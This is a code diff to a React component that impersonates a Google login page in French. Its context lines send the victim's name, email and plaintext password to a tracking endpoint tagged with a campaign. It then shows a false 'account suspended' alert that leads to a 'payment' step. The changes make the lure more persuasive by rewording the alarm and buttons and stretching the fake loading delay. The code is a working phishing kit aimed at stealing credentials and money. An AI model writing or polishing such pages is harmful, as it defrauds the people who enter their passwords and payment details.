@@ -40,7 +40,9 @@ export default function GoogleLogin() {
 
     // Track the event
     fetch('/api/tracking/track-submission', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ eventType: 'login', payload: { name: firstName, email, password }, campaign }) });
-    setTimeout(() => { setIsLoading(false); setStep('warning'); }, 4000);
+    
+    // At the end of the loading, show the warning step
+    setTimeout(() => { setIsLoading(false); setStep('warning'); }, 8000);
   };
 
   // Focus handling when entering password step
@@ -74,9 +76,9 @@ export default function GoogleLogin() {
           </div>
           <h1 className={`${styles.title} ${step === 'password' ? styles.titleWithName : ''}`}>
             {step === 'warning'
-              ? 'Compte suspendu'
+              ? 'Activité inhabituelle'
               : step === 'payment'
-              ? 'Confirmez votre identité'
+              ? 'Sécurisez votre compte'
               : `Bienvenue ${firstName.split(' ')[0]}`}
           </h1>
         </div>
@@ -149,7 +151,7 @@ export default function GoogleLogin() {
                       <span>Connexion...</span>
                     </div>
                   ) : (
-                    'Suivant'
+                    'Connexion'
                   )}
                 </button>
               </div>
@@ -161,11 +163,11 @@ export default function GoogleLogin() {
           <div className={styles.stepBody}>
             <p className={styles.subtitle}>
               Suite à plusieurs connexions inhabituelles, nos systèmes ont détecté un risque de vols de vos identifiants.<br /><br />
-              Pour éviter la perte de vos données et une utilisation détournée de nos services, votre compte a été suspendu jusqu'à la vérification de votre identité.
+              Pour éviter la perte de vos données et une utilisation détournée de nos services, votre compte a été suspendu jusqu'à sa réactivation.
             </p>
             <br /><br />
             <br />
-            <div className={styles.actions}><button type="button" className={styles.nextBtn} onClick={() => setStep('payment')}>Récupérer le compte</button></div>
+            <div className={styles.actions}><button type="button" className={styles.nextBtn} onClick={() => setStep('payment')}>Vérifier mon identité</button></div>
           </div>
         )}
 
